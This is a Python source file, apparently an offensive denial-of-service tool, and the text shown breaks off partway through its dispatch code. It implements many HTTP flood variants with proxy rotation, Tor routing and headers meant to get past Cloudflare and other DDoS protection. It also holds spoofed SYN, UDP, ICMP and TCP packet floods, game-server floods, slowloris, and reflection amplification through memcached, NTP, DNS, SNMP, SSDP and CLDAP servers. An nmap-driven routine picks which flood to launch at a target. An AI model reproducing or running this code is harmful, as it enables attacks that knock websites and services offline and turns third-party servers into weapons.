#!/usr/bin/env python3
import random
import threading
import time
import sys
import argparse
import os
import string
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from scapy.all import IP, TCP, UDP, ICMP, send
import socket
import urllib.request
import urllib.parse
import nmap
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from pathlib import Path
from typing import List, Set, Tuple
from uuid import uuid4

# Constants
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
]

REFERERS = [
    'https://www.google.com/', 'https://www.facebook.com/', 'https://twitter.com/',
    'https://www.youtube.com/', 'https://www.linkedin.com/'
]

# Global counters for monitoring
REQUESTS_SENT = 0
BYTES_SENT = 0

# Check root privileges
def check_root():
    return os.geteuid() == 0

# Load proxies
def load_proxies(file_path=None, url=None):
    proxies = []
    if url:
        with suppress(Exception):
            response = urllib.request.urlopen(url, timeout=5)
            proxies = [line.decode().strip() for line in response.readlines() if line.decode().strip()]
    if file_path and Path(file_path).exists():
        with open(file_path, 'r') as f:
            proxies.extend(line.strip() for line in f if line.strip())
    return proxies

# Proxy checking
def check_proxy(proxy, url="http://httpbin.org/get"):
    try:
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        response = session.get(url, timeout=5)
        return response.status_code < 400
    except:
        return False

def load_valid_proxies(file_path=None, url=None, threads=100):
    proxies = load_proxies(file_path, url)
    valid_proxies = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            if future.result():
                valid_proxies.append(future_to_proxy[future])
    return valid_proxies

# Load reflectors
def load_reflectors(file_path=None):
    reflectors = []
    if file_path and Path(file_path).exists():
        with open(file_path, 'r') as f:
            reflectors = [line.strip() for line in f if line.strip()]
    return reflectors

# Check Tor service
def check_tor_service():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('127.0.0.1', 9050))
        sock.close()
        return result == 0
    except:
        return False

# Random IP generation
def random_ip():
    ip_ranges = [
        ('10.', random.randint(0, 255), random.randint(0, 255)),
        ('172.', random.randint(16, 31), random.randint(0, 255)),
        ('192.168.', random.randint(0, 255)),
        *[(f"{random.randint(1, 223)}.", random.randint(0, 255), random.randint(0, 255)) for _ in range(100)]
    ]
    ip_type = random.choice(ip_ranges)
    if len(ip_type) == 3:
        first, second, third = ip_type
        return f"{first}{second}.{third}.{random.randint(0, 255)}"
    else:
        first, second = ip_type
        return f"{first}{second}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Random string generation
def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Check Kali and Nmap environment
def check_kali_nmap():
    if not os.path.exists("/usr/bin/nmap"):
        sys.exit("Error: Nmap not found. This script requires Kali Linux with Nmap installed.")
    if not check_root():
        sys.exit("Error: Nmap and this script require root privileges. Run with sudo.")

# Nmap scanning
def scan_target(target):
    nm = nmap.PortScanner()
    scripts = "broadcast-avahi-dos,http-slowloris,ipv6-ra-flood,smb-flood,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-regsvc-dos"
    nm.scan(target, arguments=f'-sV --script {scripts} -T4')
    results = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            for port in nm[host][proto].keys():
                service = nm[host][proto][port]
                scripts_output = service.get('script', {})
                results.append({
                    'port': port,
                    'service': service.get('name', ''),
                    'version': service.get('product', '') + ' ' + service.get('version', ''),
                    'vulns': [v for k, v in scripts_output.items() if 'vulnerable' in v.lower() or 'dos' in k.lower()]
                })
    return results

# Map vulnerabilities to attack methods
def map_vuln_to_method(scan_results):
    method_priority = []
    for result in scan_results:
        service = result['service'].lower()
        vulns = result['vulns']
        port = result['port']
        for vuln in vulns:
            if 'http-slowloris' in vuln.lower():
                method_priority.append('slowloris')
            elif 'broadcast-avahi-dos' in vuln.lower():
                method_priority.append('udp_flood')
            elif 'ipv6-ra-flood' in vuln.lower():
                method_priority.append('udp_flood')
            elif 'smb-flood' in vuln.lower() or 'smb-vuln' in vuln.lower():
                method_priority.extend(['smb_flood_custom', 'connection_flood'])
            elif 'dos' in vuln.lower():
                method_priority.extend(['killer_flood', 'bomb_flood', 'stress_flood'])
        if not vulns:
            if service in ['http', 'https']:
                method_priority.extend(['http_flood', 'xmlrpc_flood', 'cfbuam_flood', 'slowloris'])
            elif service == 'smb':
                method_priority.extend(['smb_flood_custom', 'connection_flood'])
            elif service == 'dns':
                method_priority.append('dns_amp')
            elif service == 'ntp':
                method_priority.append('ntp_flood')
            elif service == 'minecraft':
                method_priority.append('minecraft_flood')
            elif service == 'quic':
                method_priority.append('quic_flood')
    return method_priority if method_priority else None

# Map ports to attack methods
def map_port_to_method(port):
    http_ports = [80, 443, 8080, 8443]
    tcp_ports = [21, 22, 23, 25, 110, 143, 445, 3389]
    udp_ports = [53, 123, 161, 1900, 27015, 3478, 11211, 3283]
    if port in http_ports:
        return ['http_flood', 'slowloris', 'post_flood', 'stress_flood']
    elif port in tcp_ports:
        return ['syn_flood', 'tcp_flood', 'connection_flood']
    elif port in udp_ports:
        return ['udp_flood', 'dns_amp', 'ntp_flood']
    return ['syn_flood', 'udp_flood', 'icmp_flood']

# Monitor response
def monitor_response(target_url, proxies, is_onion=False):
    global REQUESTS_SENT, BYTES_SENT
    try:
        session = requests.Session()
        if is_onion and not check_tor_service():
            return None, None
        if is_onion:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        proxy = random.choice(proxies) if proxies and not is_onion else None
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Gpc': '1'
        }
        start_time = time.time()
        response = session.get(target_url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=4)
        latency = (time.time() - start_time) * 1000
        REQUESTS_SENT += 1
        BYTES_SENT += len(response.request.url) + len(response.request.method) + sum(len(k) + len(v) for k, v in response.request.headers.items())
        return response.status_code, latency
    except:
        return None, None

# Generic HTTP flood with enhanced headers
def generic_http_flood(target_url, duration, proxies, threads, method='GET', headers=None, data=None, is_onion=False, rpc=100):
    global REQUESTS_SENT, BYTES_SENT
    def attack():
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        if is_onion and not check_tor_service():
            return
        if is_onion:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                proxy = random.choice(proxies) if proxies and not is_onion else None
                h = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Referrer': random.choice(REFERERS) + urllib.parse.quote(target_url),
                    'X-Forwarded-For': random_ip(),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                if headers:
                    h.update(headers)
                d = data or {}
                for _ in range(rpc):
                    response = session.request(method, target_url, headers=h, proxies={'http': proxy, 'https': proxy} if proxy else None, data=d, timeout=4)
                    REQUESTS_SENT += 1
                    BYTES_SENT += len(response.request.url) + len(response.request.method) + sum(len(k) + len(v) for k, v in response.request.headers.items()) + (len(str(d)) if d else 0)
                time.sleep(random.uniform(0.01, 0.5))
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack)

# HTTP-based attack methods
def http_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    generic_http_flood(target_url, duration, proxies, threads, method='GET', is_onion=is_onion, rpc=rpc)

def post_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        {'data': random_string(1000)},
        {'data': random_string(5000)},
        {'key': random_string(20), 'value': random_string(10000)}
    ]
    generic_http_flood(target_url, duration, proxies, threads, method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def ovh_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Accept': '*/*', 'X-Forwarded-For': random_ip()},
        {'Accept': 'application/json', 'X-OVH-Signature': random_string(20)},
        {'Accept': 'text/html', 'X-Real-IP': random_ip()}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def rhex_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        {random_string(10): bytes(random_string(100), 'utf-8').hex()},
        {random_string(15): bytes(random_string(500), 'utf-8').hex()},
        {random_string(20): bytes(random_string(1000), 'utf-8').hex()}
    ]
    generic_http_flood(target_url, duration, proxies, threads, method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def stomp_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Accept': 'text/html', 'Cookie': f'chk_captcha={random_string(20)}'},
        {'Accept': '*/*', 'Cookie': f'captcha={random_string(30)}'},
        {'Accept': 'application/json', 'Cookie': f'verify={random_string(25)}'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def stress_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        {'payload': random_string(10000)},
        {'payload': random_string(50000)},
        {'payload': random_string(100000)}
    ]
    generic_http_flood(target_url, duration, proxies, threads, method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def dyn_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    sub_domains = [
        f"{random_string(10)}.{target_url.split('://')[1]}",
        f"{random_string(15)}.{target_url.split('://')[1]}",
        f"{random_string(20)}.{target_url.split('://')[1]}"
    ]
    generic_http_flood(f"http://{random.choice(sub_domains)}", duration, proxies, threads, is_onion=is_onion, rpc=rpc)

def downloader_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    def attack():
        global REQUESTS_SENT, BYTES_SENT
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        if is_onion and not check_tor_service():
            return
        if is_onion:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                proxy = random.choice(proxies) if proxies and not is_onion else None
                headers = [
                    {'User-Agent': random.choice(USER_AGENTS), 'Range': 'bytes=0-100'},
                    {'User-Agent': random.choice(USER_AGENTS), 'Range': 'bytes=0-500'},
                    {'User-Agent': random.choice(USER_AGENTS), 'Range': 'bytes=0-1000'}
                ]
                with session.get(target_url, headers=random.choice(headers), proxies={'http': proxy, 'https': proxy} if proxy else None, stream=True, timeout=4) as response:
                    for chunk in response.iter_content(chunk_size=1024):
                        BYTES_SENT += len(chunk)
                        time.sleep(0.2)
                    REQUESTS_SENT += 1
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack)

def head_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    generic_http_flood(target_url, duration, proxies, threads, method='HEAD', is_onion=is_onion, rpc=rpc)

def null_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'User-Agent': ''},
        {'User-Agent': None},
        {'User-Agent': ' '}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def cookie_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Cookie': f'session={random_string(20)}'},
        {'Cookie': f'token={random_string(30)}; id={random_string(15)}'},
        {'Cookie': f'auth={random_string(25)}; session={random_string(20)}'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def pps_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    generic_http_flood(target_url, duration, proxies, threads, method='GET', is_onion=is_onion, rpc=rpc)

def even_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {f'X-Header-{i}': random_string(10) for i in range(10)},
        {f'X-Header-{i}': random_string(20) for i in range(15)},
        {f'X-Header-{i}': random_string(30) for i in range(20)}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def gsb_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
        {'User-Agent': 'AdsBot-Google (+http://www.google.com/adsbot.html)'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def dgb_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'X-Requested-With': 'XMLHttpRequest', 'Accept': '*/*'},
        {'X-DDoS-Guard': random_string(20), 'Accept': 'application/json'},
        {'X-Forwarded-For': random_ip(), 'Accept': '*/*'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def avb_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'X-Arvancloud-Signature': random_string(20)},
        {'X-Arvancloud-Token': random_string(30)},
        {'X-Arvancloud-ID': random_string(25)}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def bot_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
        {'User-Agent': 'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)'},
        {'User-Agent': 'Yahoo! Slurp; (+http://help.yahoo.com/help/us/ysearch/slurp)'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def apache_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Range': 'bytes=0-18446744073709551615'},
        {'Range': 'bytes=0-1000000,1000000-2000000'},
        {'Range': 'bytes=0-500000'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def xmlrpc_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        f"""<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{target_url}</string></value></param><param><value><string>{random_string(10)}.com</string></value></param></params></methodCall>""",
        f"""<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>""",
        f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{random_string(10)}</string></value></param><param><value><string>{random_string(10)}</string></value></param></params></methodCall>"""
    ]
    generic_http_flood(f"{target_url}/xmlrpc.php", duration, proxies, threads, method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def cfbuam_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Cookie': f'cf_clearance={random_string(20)}', 'Sec-Fetch-Mode': 'navigate'},
        {'Cookie': f'__cf_bm={random_string(30)}', 'Sec-Fetch-Site': 'same-origin'},
        {'Cookie': f'cf_chl_2={random_string(25)}', 'Sec-Fetch-Dest': 'document'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def bypass_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Vary': random_string(10), 'X-Forwarded-For': random_ip()},
        {'Accept-Encoding': 'gzip, deflate', 'X-Real-IP': random_ip()},
        {'Cache-Control': 'no-store', 'X-Forwarded-For': random_ip()}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

def bomb_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        {'payload': random_string(5000)},
        {'payload': random_string(20000)},
        {'payload': random_string(100000)}
    ]
    generic_http_flood(target_url, duration, proxies, threads, method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def killer_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    payloads = [
        {'data': random_string(5000)},
        {'data': random_string(10000)},
        {'data': random_string(50000)}
    ]
    generic_http_flood(target_url, duration, proxies, max(threads * 2, 1000), method='POST', data=random.choice(payloads), is_onion=is_onion, rpc=rpc)

def cfb_flood(target_url, duration, proxies, threads, is_onion=False, rpc=100):
    headers = [
        {'Cookie': f'cf_clearance={random_string(20)}'},
        {'Cookie': f'__cf_bm={random_string(30)}'},
        {'Cookie': f'cf_chl_2={random_string(25)}'}
    ]
    generic_http_flood(target_url, duration, proxies, threads, headers=random.choice(headers), is_onion=is_onion, rpc=rpc)

# Layer 4/3 attack methods
def syn_flood(target_ip, target_port, duration, spoof):
    if not check_root():
        sys.exit("Error: syn_flood requires root privileges. Run with sudo.")
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                tcp_pkt = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')
                send(ip_pkt/tcp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def udp_flood(target_ip, target_port, duration, spoof):
    if not check_root():
        sys.exit("Error: udp_flood requires root privileges. Run with sudo.")
    payloads = [
        b"flood" * 100,
        random_string(500).encode(),
        random_string(1000).encode()
    ]
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                udp_pkt = UDP(sport=random.randint(1024, 65535), dport=target_port) / random.choice(payloads)
                send(ip_pkt/udp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def icmp_flood(target_ip, duration, spoof):
    if not check_root():
        sys.exit("Error: icmp_flood requires root privileges. Run with sudo.")
    payloads = [
        b'',
        random_string(100).encode(),
        random_string(500).encode()
    ]
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                icmp_pkt = ICMP(type="echo-request") / random.choice(payloads)
                send(ip_pkt/icmp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def tcp_flood(target_ip, target_port, duration, spoof):
    if not check_root():
        sys.exit("Error: tcp_flood requires root privileges. Run with sudo.")
    flags = ['A', 'F', 'R', 'P']
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                tcp_pkt = TCP(sport=random.randint(1024, 65535), dport=target_port, flags=random.choice(flags))
                send(ip_pkt/tcp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def connection_flood(target_ip, target_port, duration, spoof):
    if not check_root():
        sys.exit("Error: connection_flood requires root privileges. Run with sudo.")
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                tcp_pkt = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')
                send(ip_pkt/tcp_pkt, verbose=0)
                time.sleep(0.05)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def generic_udp_flood(target_ip, target_port, duration, spoof, payloads):
    if not check_root():
        sys.exit("Error: UDP-based flood requires root privileges. Run with sudo.")
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=random_ip() if spoof else None, dst=target_ip)
                udp_pkt = UDP(sport=random.randint(1024, 65535), dport=target_port) / random.choice(payloads)
                send(ip_pkt/udp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def vse_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\xff\xff\xff\xffgetinfo',
        b'\xff\xff\xff\xffTSource Engine Query\x00',
        b'\xff\xff\xff\xffplayers',
        b'\xff\xff\xff\xffrules'
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def ts3_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\x00\x00\x00\x00',
        b'\x01\x00\x00\x00query',
        b'\x00\x00\x00\x01status',
        random_string(100).encode()
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def fivem_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\xff\xff\xff\xffgetstatus',
        b'\xff\xff\xff\xffinfo',
        b'\xff\xff\xff\xffplayers',
        random_string(200).encode()
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def mcbot_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\x02\x00' + random_string(10).encode(),
        b'\x01\x00' + random_string(20).encode(),
        b'\x00\x00' + random_string(50).encode()
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def minecraft_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\x01\x00\x00\x00\x00',
        b'\x00\x01' + random_string(10).encode(),
        b'\x01\x00\x00\x00\x00\x00\x00\x00'
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def mcpe_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\x01\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x02\x00\x00\x00\x00\x00\x00\x00\x00',
        random_string(50).encode()
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def quic_flood(target_ip, target_port, duration, spoof):
    payloads = [
        b'\x00\x00\x00\x01' + random_string(100).encode(),
        b'\x01\x00\x00\x00' + random_string(200).encode(),
        b'\x00\x00\x00\x02' + random_string(500).encode()
    ]
    generic_udp_flood(target_ip, target_port, duration, spoof, payloads)

def generic_amplification(target_ip, reflector, duration, spoof, payloads, dport):
    if not check_root():
        sys.exit("Error: Amplification attack requires root privileges. Run with sudo.")
    try:
        reflector_ip, reflector_port = reflector.split(':')
        reflector_port = int(reflector_port)
    except ValueError:
        return
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                ip_pkt = IP(src=target_ip if spoof else None, dst=reflector_ip)
                udp_pkt = UDP(sport=random.randint(1024, 65535), dport=reflector_port) / random.choice(payloads)
                send(ip_pkt/udp_pkt, verbose=0)
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(attack)

def mem_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
        b'\x00\x00\x00\x00\x00\x01\x00\x00stats cachedump 1 0 0\r\n',
        b'\x00\x00\x00\x00\x00\x01\x00\x00stats items\r\n'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 11211)

def ntp_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x17\x00\x03\x2a\x00\x00\x00\x00',
        b'\x17\x00\x02\x2a\x00\x00\x00\x00',
        b'\x17\x00\x01\x2a\x00\x00\x00\x00'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 123)

def char_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x00',
        random_string(50).encode(),
        random_string(100).encode()
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 19)

def cldap_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x30\x02\x01\x01\x63\x00',
        b'\x30\x84\x00\x00\x00\x20\x02\x01\x01\x63\x84\x00\x00\x00\x16',
        b'\x30\x02\x01\x02\x63\x00'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 389)

def ard_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x00\x00\x00\x01',
        b'\x00\x00\x00\x02' + random_string(50).encode(),
        b'\x00\x00\x00\x03' + random_string(100).encode()
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 3283)

def rdp_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x00\x00\x00\x01',
        b'\x03\x00\x00\x09' + random_string(50).encode(),
        b'\x03\x00\x00\x08' + random_string(100).encode()
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 3389)

def snmp_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x1c\x02\x04\x00\x00\x00\x00',
        b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x1c\x02\x04\x00\x00\x00\x01',
        b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x1c\x02\x04\x00\x00\x00\x02'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 161)

def ssdp_flood(target_ip, duration, spoof, reflectors):
    payloads = [
        b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n',
        b'NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n',
        b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\n'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 1900)

def slowloris(target_ip, target_port, duration, threads):
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            with suppress(Exception):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                headers = [
                    f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target_ip}\r\n",
                    f"GET /?{random_string(10)} HTTP/1.1\r\nHost: {target_ip}\r\nAccept: text/html\r\n",
                    f"GET /?{random_string(15)} HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n"
                ]
                sock.send(random.choice(headers).encode())
                sent = 0
                while sent < 2 and time.time() < end_time:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    sent += 1
                    time.sleep(15)
                sock.close()
    
    with ThreadPoolExecutor(max_workers=max(threads, 200)) as executor:
        for _ in range(max(threads, 200)):
            executor.submit(attack)

def dns_amp(target_ip, duration, spoof, reflectors):
    payloads = [
        b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
        b'\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
        b'\x9a\xbc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    ]
    for reflector in reflectors:
        generic_amplification(target_ip, reflector, duration, spoof, payloads, 53)

# Auto attack with priority logic
def auto_attack(target, port, duration, proxies, threads, spoof, reflectors, multi_methods, rpc=100):
    global REQUESTS_SENT, BYTES_SENT
    check_kali_nmap()
    print(f"Scanning {target} with Nmap for DoS vulnerabilities...")
    scan_results = scan_target(target)
    selected_methods = multi_methods if multi_methods else map_vuln_to_method(scan_results)
    
    if not selected_methods:
        print(f"No DoS vulnerabilities or specific service found, selecting methods based on port {port}...")
        selected_methods = map_port_to_method(port)
    
    print(f"Selected attack methods: {selected_methods}")

    def run_attack(method, t, p, d, prox, th, sp, ref):
        is_onion = '.onion' in t
        if method == 'syn': syn_flood(t, p, d, sp)
        elif method == 'udp': udp_flood(t, p, d, sp)
        elif method == 'icmp': icmp_flood(t, d, sp)
        elif method == 'tcp': tcp_flood(t, p, d, sp)
        elif method == 'connection': connection_flood(t, p, d, sp)
        elif method == 'vse': vse_flood(t, p, d, sp)
        elif method == 'ts3': ts3_flood(t, p, d, sp)
        elif method == 'fivem': fivem_flood(t, p, d, sp)
        elif method == 'mcbot': mcbot_flood(t, p, d, sp)
        elif method == 'minecraft': minecraft_flood(t, p, d, sp)
        elif method == 'mcpe': mcpe_flood(t, p, d, sp)
        elif method == 'quic': quic_flood(t, p, d, sp)
        elif method == 'mem': mem_flood(t, d, sp, ref)
        elif method == 'ntp': ntp_flood(t, d, sp, ref)
